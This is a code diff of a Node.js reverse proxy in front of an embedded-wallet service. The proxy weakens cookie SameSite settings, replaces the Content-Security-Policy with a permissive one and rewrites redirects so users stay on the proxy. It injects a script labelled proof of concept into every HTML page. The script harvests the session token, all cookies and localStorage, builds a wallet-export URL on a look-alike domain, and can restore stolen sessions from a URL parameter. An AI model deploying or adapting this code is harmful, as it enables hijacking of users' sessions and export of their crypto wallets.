@@ -8,7 +8,7 @@ export const config = {
   }
 };
 
-const ORIGIN = "https://clthf5zo505s513atuph9xful.api.privy.systems"; // e.g. "https://origin.example.com"
+const ORIGIN = process.env.ORIGIN; // e.g. "https://origin.example.com"
 
 const proxy = createProxyMiddleware({
   target: ORIGIN,
@@ -18,94 +18,103 @@ const proxy = createProxyMiddleware({
     let buffer = Buffer.from('');
     proxyRes.on('data', chunk => buffer = Buffer.concat([buffer, chunk]));
     proxyRes.on('end', () => {
-      // 1) Modify Set-Cookie headers: ensure any SameSite attribute is set to None
+      // 1) Modify Set-Cookie: ensure any SameSite attribute is set to None
       const rawCookies = proxyRes.headers['set-cookie'] || [];
       const modifiedCookies = rawCookies.map(cookie =>
-        cookie.replace(/;? *SameSite=[^;]*/gi, '; SameSite=None')
+        cookie.replace(/;?\s*SameSite=[^;]*/gi, '; SameSite=None')
       );
       if (modifiedCookies.length) {
         res.setHeader('Set-Cookie', modifiedCookies);
       }
 
-      // 2) Override Content-Security-Policy
+      // 2) Override Content-Security-Policy header
       res.setHeader(
         'Content-Security-Policy',
         "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:"
       );
 
-      // 3) Copy other headers
+      // 3) Rewrite Location header to route through proxy
+      const locationHeader = proxyRes.headers['location'];
+      if (locationHeader) {
+        const protocol = req.headers['x-forwarded-proto'] || (req.connection.encrypted ? 'https' : 'http');
+        const host = req.headers['host'];
+        const newLocation = locationHeader.startsWith(ORIGIN)
+          ? locationHeader.replace(ORIGIN, `${protocol}://${host}`)
+          : locationHeader;
+        res.setHeader('Location', newLocation);
+      }
+
+      // 4) Copy other headers except ones we override
       Object.entries(proxyRes.headers).forEach(([name, value]) => {
         const lower = name.toLowerCase();
-        if (lower === 'set-cookie' || lower === 'content-security-policy') return;
+        if (['set-cookie', 'content-security-policy', 'location'].includes(lower)) return;
         res.setHeader(name, value);
       });
 
-      // 4) Inject script into HTML responses
+      // 5) Inject script into HTML responses
       const contentType = proxyRes.headers['content-type'] || '';
       if (contentType.includes('text/html')) {
         let text = buffer.toString('utf8');
         const scriptTag = `<script>
-  (function() {
-    // POC cookie & localStorage exporter
-    function getCookie(name) {
-      const v = `; ${document.cookie}`;
-      const parts = v.split(`; ${name}=`);
-      if (parts.length === 2) return parts.pop().split(';').shift();
-    }
-    function getLastPartOfLocalStorageKey(prefix) {
-      for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        if (key.startsWith(prefix)) {
-          const parts = key.split(':');
-          return parts[parts.length-1];
-        }
-      }
-      return null;
-    }
-    function encodeBase64(data) {
-      return btoa(unescape(encodeURIComponent(data)));
-    }
-    function decodeBase64(data) {
-      return decodeURIComponent(escape(atob(data)));
-    }
-    function setCookies(cookies, path = '/') {
-      cookies.split(';').forEach(c => {
-        document.cookie = `${c.trim()}; path=${path}`;
-      });
-    }
-    function setLocalStorage(data) {
-      const obj = JSON.parse(data);
-      for (const k in obj) {
-        localStorage.setItem(k, obj[k]);
+(function() {
+  function getCookie(name) {
+    const v = '; ' + document.cookie;
+    const parts = v.split('; ' + name + '=');
+    if (parts.length === 2) return parts.pop().split(';').shift();
+  }
+  function getLastPartOfLocalStorageKey(prefix) {
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      if (key.startsWith(prefix)) {
+        const parts = key.split(':');
+        return parts[parts.length - 1];
       }
     }
-    const params = new URLSearchParams(window.location.search);
-    if (params.has('POC')) {
-      const val = decodeBase64(params.get('POC'));
-      const [cookieData, lsData] = val.split('|');
-      setCookies(cookieData);
-      setLocalStorage(lsData);
-    } else {
-      const token = getCookie('privy-token');
-      const addr = getLastPartOfLocalStorageKey('privy_wallet');
-      if (token && addr) {
-        const exportUrl = `https://privy.awc-eg.team/apps/clthf5zo505s513atuph9xful/embedded-wallets/export?token=${token}&address=${addr}`;
-        const allCookies = document.cookie;
-        const lsString = JSON.stringify(Object.fromEntries(Object.entries(localStorage)));
-        const enc = encodeBase64(`${allCookies}|${lsString}`);
-        const finalUrl = `${exportUrl}&POC=${enc}`;
-        alert(finalUrl);
-        console.log('The POC URL :', finalUrl);
-      }
+    return null;
+  }
+  function encodeBase64(data) {
+    return btoa(unescape(encodeURIComponent(data)));
+  }
+  function decodeBase64(data) {
+    return decodeURIComponent(escape(atob(data)));
+  }
+  function setCookies(cookies, path = '/') {
+    cookies.split(';').forEach(c => {
+      document.cookie = c.trim() + '; path=' + path;
+    });
+  }
+  function setLocalStorage(data) {
+    const obj = JSON.parse(data);
+    for (const k in obj) {
+      localStorage.setItem(k, obj[k]);
     }
-  })();
+  }
+  const params = new URLSearchParams(window.location.search);
+  if (params.has('POC')) {
+    const val = decodeBase64(params.get('POC'));
+    const [cookieData, lsData] = val.split('|');
+    setCookies(cookieData);
+    setLocalStorage(lsData);
+  } else {
+    const token = getCookie('privy-token');
+    const addr = getLastPartOfLocalStorageKey('privy_wallet');
+    if (token && addr) {
+      const exportUrl = 'https://privy.awc-eg.team/apps/clthf5zo505s513atuph9xful/embedded-wallets/export?token=' + token + '&address=' + addr;
+      const allCookies = document.cookie;
+      const lsString = JSON.stringify(Object.entries(localStorage).reduce((o, [k, v]) => { o[k] = v; return o; }, {}));
+      const enc = encodeBase64(allCookies + '|' + lsString);
+      alert(enc);
+      console.log('The POC URL :', enc);
+    }
+  }
+})();
 </script>`;
         text = text.replace('</body>', `${scriptTag}</body>`);
         res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
         return res.end(text);
       }
 
-      // 5) For non-HTML responses: pass through
+      // 6) For non-HTML responses: pass through
       res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
       res.end(buffer);
     });
